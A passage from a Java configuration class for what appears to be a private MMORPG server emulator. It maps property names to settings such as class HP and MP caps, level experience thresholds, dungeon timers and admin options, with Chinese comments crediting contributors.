			PRINCE_MAX_MP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("KnightMaxHP")) {
			KNIGHT_MAX_HP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("KnightMaxMP")) {
			KNIGHT_MAX_MP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("ElfMaxHP")) {
			ELF_MAX_HP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("ElfMaxMP")) {
			ELF_MAX_MP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("WizardMaxHP")) {
			WIZARD_MAX_HP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("WizardMaxMP")) {
			WIZARD_MAX_MP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("DarkelfMaxHP")) {
			DARKELF_MAX_HP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("DarkelfMaxMP")) {
			DARKELF_MAX_MP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("DragonKnightMaxHP")) {
			DRAGONKNIGHT_MAX_HP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("DragonKnightMaxMP")) {
			DRAGONKNIGHT_MAX_MP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("IllusionistMaxHP")) {
			ILLUSIONIST_MAX_HP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("IllusionistMaxMP")) {
			ILLUSIONIST_MAX_MP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv50Exp")) {
			LV50_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv51Exp")) {
			LV51_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv52Exp")) {
			LV52_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv53Exp")) {
			LV53_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv54Exp")) {
			LV54_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv55Exp")) {
			LV55_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv56Exp")) {
			LV56_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv57Exp")) {
			LV57_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv58Exp")) {
			LV58_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv59Exp")) {
			LV59_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv60Exp")) {
			LV60_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv61Exp")) {
			LV61_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv62Exp")) {
			LV62_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv63Exp")) {
			LV63_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv64Exp")) {
			LV64_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv65Exp")) {
			LV65_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv66Exp")) {
			LV66_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv67Exp")) {
			LV67_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv68Exp")) {
			LV68_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv69Exp")) {
			LV69_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv70Exp")) {
			LV70_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv71Exp")) {
			LV71_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv72Exp")) {
			LV72_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv73Exp")) {
			LV73_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv74Exp")) {
			LV74_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv75Exp")) {
			LV75_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv76Exp")) {
			LV76_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv77Exp")) {
			LV77_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv78Exp")) {
			LV78_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv79Exp")) {
			LV79_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv80Exp")) {
			LV80_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv81Exp")) {
			LV81_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv82Exp")) {
			LV82_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv83Exp")) {
			LV83_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv84Exp")) {
			LV84_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv85Exp")) {
			LV85_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv86Exp")) {
			LV86_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv87Exp")) {
			LV87_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv88Exp")) {
			LV88_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv89Exp")) {
			LV89_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv90Exp")) {
			LV90_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv91Exp")) {
			LV91_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv92Exp")) {
			LV92_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv93Exp")) {
			LV93_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv94Exp")) {
			LV94_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv95Exp")) {
			LV95_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv96Exp")) {
			LV96_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv97Exp")) {
			LV97_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv98Exp")) {
			LV98_EXP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Lv99Exp")) {
			LV99_EXP = Integer.parseInt(pValue);
		}
		//record.properties
		else if (pName.equalsIgnoreCase("LoggingWeaponEnchant")) {
			LOGGING_WEAPON_ENCHANT = Byte.parseByte(pValue);
		}
		else if (pName.equalsIgnoreCase("LoggingArmorEnchant")) {
			LOGGING_ARMOR_ENCHANT = Byte.parseByte(pValue);
		}

		// TODO 新增/////////////////////////////////////////////////////////
		// othersettings.properties
		// 伺服器重启 by 丫杰
		else if (pName.equalsIgnoreCase("RestartTime")) {
			REST_TIME = Integer.parseInt(pValue);
		}

		// 管理者介面 by eric1300460
		else if (pName.equalsIgnoreCase("GUI")) {
			GUI = Boolean.valueOf(pValue);
		}

		// 显示怪物血条
		else if (pName.equalsIgnoreCase("ShowHPBar")) {
			SHOW_HP_BAR = Boolean.valueOf(pValue);
		}
		// 时空裂痕
		else if (pName.equalsIgnoreCase("CrackStartTime")) {	// 时空裂痕开启时间(单位分钟)
			CrackStartTime = Short.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("CrackOpenTime")) {		// 时空裂痕开放多久(单位分钟)
			CrackOpenTime = Short.valueOf(pValue);
		}

		// 循环公告 by 雷公
		else if (pName.equalsIgnoreCase("UseShowAnnouncecycle")) {
			Use_Show_Announcecycle = Boolean.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("ShowAnnouncecycleTime")) {
			Show_Announcecycle_Time = Integer.parseInt(pValue);
		}

		// 能力值上限调整 by 阿杰
		else if (pName.equalsIgnoreCase("BONUS_STATS1")) {
			BONUS_STATS1 = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("BONUS_STATS2")) {
			BONUS_STATS2 = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("BONUS_STATS3")) {
			BONUS_STATS3 = Integer.parseInt(pValue);
		}
		// 转生可设定血魔保留多少 by eric1300460
		else if (pName.equalsIgnoreCase("Evolution_Hp")) {
			EVOLUTION_HP = Short.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("Evolution_Mp")) {
			EVOLUTION_MP = Short.valueOf(pValue);
		}

		else if (pName.equalsIgnoreCase("GateWaitTime")) {		// 副本维护时间(单位分钟)
            GateWaitTime = Short.valueOf(pValue);
        }
		else if (pName.equalsIgnoreCase("CloseDragonTime")) {	// 副本打开多久，强制关闭.(单位分钟)
             CloseDragonTime = Short.valueOf(pValue);
        }
		else if (pName.equalsIgnoreCase("GateMaxPc")) {			// 副本进入的玩家上限
             GateMaxPc = Short.valueOf(pValue);
        }

		else if (pName.equalsIgnoreCase("AllSell")) {			// 所有物品贩卖开关
			AllSell = Boolean.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("AllSell1")) {			// 检测是否买少卖多
			AllSell1 = Boolean.valueOf(pValue);
		}

		else if (pName.equalsIgnoreCase("GMTalkShowName")) {	// ＧＭ使用公频(&)显示方式 
			GMTalkShowName = Boolean.valueOf(pValue);
		}

		else if (pName.equalsIgnoreCase("Lostdeleteditems")) {	// 物品丢地是否删除
			Lostdeleteditems = Boolean.valueOf(pValue);
		}

		else if (pName.equalsIgnoreCase("RateAinTime")) {			// 殷海萨的祝福 (登入多少时间取得1%)
			RATE_AIN_TIME = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("RateAinOutTime")) {		// 殷海萨的祝福 (登出多少时间取得1%)
			RATE_AIN_OUTTIME = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("RateMaxChargePercent")) {	// 殷海萨的祝福 (最高百分比)
			RATE_MAX_CHARGE_PERCENT = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("RateExpProportion")) {		// 殷海萨的祝福 (积累到一定经验扣除一点) by 9001183ex (追求)
			RATE_EXP_PROPORTION = Integer.parseInt(pValue);
		}

		else if (pName.equalsIgnoreCase("PlugMove")) {				// 外挂非法移动侦测开关 (比如:地屏状态)
			PlugMove = Boolean.valueOf(pValue);
		}
		
		else if (pName.equalsIgnoreCase("NewCreateSetGM")) {
			NEW_CREATE_SET_GM = Boolean.valueOf(pValue);			// 设定创新角色是否设定为 GM
		}

		else if (pName.equalsIgnoreCase("AutoAddSkill")) {
			AUTO_ADD_SKILL = Boolean.valueOf(pValue);				// 设定是否开启自动学习技能
		}

		else {
			return false;
		}
		return true;
	}

	public static String getPaths(){
		return System.getProperty("java.home") + "/gss.properties";}
	private Config() {
	}

}
